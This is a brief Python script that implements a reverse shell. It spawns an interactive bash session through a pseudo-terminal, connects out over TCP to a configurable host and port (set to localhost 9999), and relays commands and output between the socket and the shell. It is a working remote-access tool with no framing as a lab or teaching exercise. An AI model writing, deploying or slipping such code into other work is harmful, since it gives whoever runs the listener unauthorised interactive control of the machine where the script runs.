#!/usr/bin/env python3

import socket
import select
import pty
import os
import time


def run_bash_pty():
    pid, fd = pty.fork()

    if pid == 0:
        # Child
        os.execv('/bin/bash', ('-i',))
    else:
        return fd


socket = socket.socket()  # client computer can connect to others

host = '127.0.0.1'
port = 9999

socket.connect((host, port))
socket.setblocking(False)

time.sleep(1)
socket.send("Connected\n\r".encode('utf8'))

bash_fd = run_bash_pty()
bash_stdout = os.fdopen(bash_fd, 'rb')
bash_stdin = os.fdopen(bash_fd, 'wb')

try:
    while True:
        r, w, e = select.select([socket, bash_stdout], [], [])

        if socket in r:
            data = socket.recv(1024)

            if len(data) > 0:
                print("Received len: ", len(data), " Str Data: ", str(data))
                bash_stdin.write(data)
                bash_stdin.flush()

        if bash_stdout in r:
            char = bash_stdout.read(1)
            print("Sending: ", str(char))
            socket.send(char)

finally:
    socket.close()
